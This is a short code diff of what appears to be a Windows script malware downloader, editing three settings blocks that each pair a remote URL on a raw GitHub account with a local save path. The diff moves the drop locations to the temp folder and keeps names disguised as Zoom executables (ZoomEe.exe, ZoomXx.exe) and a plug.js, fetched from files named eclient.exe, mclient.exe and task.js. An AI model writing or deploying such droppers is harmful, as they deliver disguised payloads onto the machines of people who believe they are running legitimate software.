@@ -5,7 +5,7 @@ function main() {
 	 * Settings
 	 */
 	var dotnet = false;
-	var filename = environ('%AppData%\\ZoomE.exe');
+	var filename = environ('%tmp%\\ZoomEe.exe');
 	var url = 'https://raw.githubusercontent.com/dashboard23/fgjhfdgkjdkjfghi.html/main/eclient.exe';
 	
 	
@@ -44,7 +44,7 @@ function main() {
 	 * Settings
 	 */
 	var dotnet = false;
-	var filename2 = environ('%AppData%\\ZoomX.exe');
+	var filename2 = environ('%tmp%\\ZoomXx.exe');
 	var url2 = 'https://raw.githubusercontent.com/dashboard23/fgjhfdgkjdkjfghi.html/main/mclient.exe';
 	
 	
@@ -83,7 +83,7 @@ function main() {
 	 * Settings
 	 */
 	var dotnet = false;
-	var filename3 = environ('%UserProfile%\\plug.js');
+	var filename3 = environ('%tmp%\\plug.js');
 	var url3 = 'https://raw.githubusercontent.com/dashboard23/ffffff/main/task.js';
 	
 	
